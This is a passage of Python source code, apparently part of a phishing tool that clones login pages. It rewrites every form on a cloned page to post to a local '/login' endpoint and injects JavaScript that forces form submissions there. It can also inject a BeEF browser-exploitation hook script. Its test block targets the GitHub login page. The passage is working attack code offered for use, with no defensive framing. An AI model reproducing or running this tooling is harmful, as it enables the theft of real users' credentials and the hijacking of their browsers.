        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': clone_env['url'],
        'Origin': clone_env['base_url'],
    }

def get_perfect_subdir(resource_type, filename):
    """Get perfect subdirectory"""
    type_dirs = {
        'css': 'css',
        'js': 'js',
        'image': 'images',
        'font': 'fonts'
    }
    
    if resource_type in type_dirs:
        return type_dirs[resource_type]
        
    ext = os.path.splitext(filename)[1].lower()
    ext_dirs = {
        '.css': 'css',
        '.js': 'js',
        '.jpg': 'images', '.jpeg': 'images', '.png': 'images', 
        '.gif': 'images', '.svg': 'images', '.webp': 'images',
        '.woff': 'fonts', '.woff2': 'fonts', '.ttf': 'fonts'
    }
    
    return ext_dirs.get(ext, 'assets')

def process_perfect_forms(soup):
    """Perfect form processing"""
    for form in soup.find_all('form'):
        original_action = form.get('action', '')
        if original_action:
            form['data-original-action'] = original_action
        form['action'] = '/login'
        form['method'] = 'post'

def add_perfect_form_override(soup):
    """Add perfect JavaScript form override"""
    script = soup.new_tag('script')
    script.string = '''
    (function() {
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('form').forEach(function(form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    this.action = '/login';
                    this.method = 'post';
                    this.submit();
                });
            });
        });
    })();
    '''
    
    head = soup.find('head')
    if head:
        head.insert(0, script)

def add_perfect_beef_hook(soup):
    """Add perfect BeEF hook"""
    script = soup.new_tag('script')
    script['src'] = 'http://localhost:3000/hook.js'
    script['type'] = 'text/javascript'
    
    body = soup.find('body')
    if body:
        body.append(script)

def process_regex_bypass(html_content, beef):
    """Regex processing fallback"""
    # Form processing
    html_content = re.sub(
        r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
        r'\1action="/login" data-original-action="\2"\3',
        html_content,
        flags=re.IGNORECASE
    )
    
    if beef == 'yes':
        beef_hook = '<script src="http://localhost:3000/hook.js"></script>'
        html_content = html_content.replace('</body>', beef_hook + '</body>')
    
    return html_content

def save_perfect_clone(html_content, clone_env):
    """Save perfect clone with metadata"""
    try:
        os.makedirs(clone_env['output_dir'], exist_ok=True)
        
        # Save main HTML
        with open(f'{clone_env["output_dir"]}/index.html', 'w', encoding='utf-8', errors='ignore') as f:
            f.write(html_content)

        # Save metadata
        success_rate = (len(PERFECT_CONFIG.downloaded_resources) / 
                       max(1, PERFECT_CONFIG.request_count)) * 100
        
        metadata = {
            'timestamp': time.time(),
            'target_url': clone_env['url'],
            'resources_downloaded': len(PERFECT_CONFIG.downloaded_resources),
            'resources_failed': len(PERFECT_CONFIG.failed_resources),
            'success_rate': f"{success_rate:.1f}%",
            'clone_version': '3.1_enhanced'
        }

        with open(f'{clone_env["output_dir"]}/metadata.json', 'w') as f:
            json.dump(metadata, f, indent=2)

        return True

    except Exception as e:
        print(f"Save failed: {e}")
        return False

# Main execution for testing
if __name__ == "__main__":
    # Test with GitHub login page
    test_url = "https://github.com/login"
    test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    
    print("🧪 Testing enhanced cloning system...")
    result = clone(test_url, test_user_agent, "no")
    
    if result:
        print("🎉 Test completed successfully!")
    else:
        print("❌ Test failed!")
        
    print(f"\n📊 Final Stats:")
    print(f"Resources cached: {len(PERFECT_CONFIG.downloaded_resources)}")
    print(f"Failed resources: {len(PERFECT_CONFIG.failed_resources)}")
    print(f"Bypass attempts: {PERFECT_CONFIG.bypass_count}")
    print(f"Total requests: {PERFECT_CONFIG.request_count}")
    
    if PERFECT_CONFIG.request_count > 0:
        success_rate = (PERFECT_CONFIG.bypass_count / PERFECT_CONFIG.request_count) * 100
        print(f"Success rate: {success_rate:.1f}%")